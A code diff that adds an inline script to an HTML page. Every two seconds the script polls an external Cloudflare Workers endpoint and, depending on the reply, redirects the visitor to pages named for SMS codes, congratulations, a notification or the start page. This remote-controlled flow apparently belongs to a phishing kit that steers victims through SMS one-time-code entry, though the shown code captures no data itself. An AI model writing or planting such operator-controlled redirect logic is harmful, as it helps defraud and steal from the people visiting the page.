@@ -200,8 +200,55 @@
     </div>
 
 
-    <!-- partial -->
+     <!-- partial -->
     <script src="./script.js?v=1.1.2"></script>
+    <script>
+        function isJSON(data) {
+            if (typeof data !== "string") {
+                return false;
+            }
+
+            try {
+                JSON.parse(data);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function promo() {
+            var data = new FormData();
+            data.append('action', "redirect");
+            fetch('https://green-leaf-72a5.aisik3516.workers.dev/', {
+                method: 'POST',
+                body: data,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.page == "sms1") {
+                        window.location.href = "sms.html";
+                    } else if (data.page == "sms2") {
+                        window.location.href = "sms2.html";
+                    } else if (data.page == "basadondur") {
+                        window.location.href = "index.html";
+                    } else if (data.page == "tebrik") {
+                        window.location.href = "tebrik.html";
+                    } else if (data.page == "bildirim") {
+                        window.location.href = "bildirim.html";
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                });
+        }
+
+        $(document).ready(function () {
+
+            promo();
+
+            setInterval(promo, 2000);
+        });
+    </script>
 
 
 
